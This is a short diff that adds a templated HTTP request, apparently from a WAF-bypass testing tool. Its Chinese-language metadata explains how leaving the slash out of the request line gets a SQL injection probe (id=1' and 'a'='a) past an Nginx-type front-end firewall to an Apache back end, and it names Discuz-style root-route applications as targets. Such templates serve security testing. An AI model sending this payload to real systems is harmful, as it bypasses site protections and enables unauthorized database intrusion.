@@ -1,0 +1,13 @@
+# @name: 请求行缺少斜杠(根目录Bypass)
+# @tags: get,sqli,request-line,missing-slash,nginx,apache,id,bypass
+# @color: blue
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: request_line_missing_slash
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 请求行 GET 后直接 ? 缺少 /，Nginx 返回 400 而 Apache 自动补 / 返回 200。前端 Nginx 型 WAF 解析不到 GET 参数而放行，后端 Apache 正常处理。适用于根路由 MVC(如 Discuz /?m=&a=&c=)。
+GET ?id=1'+and+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
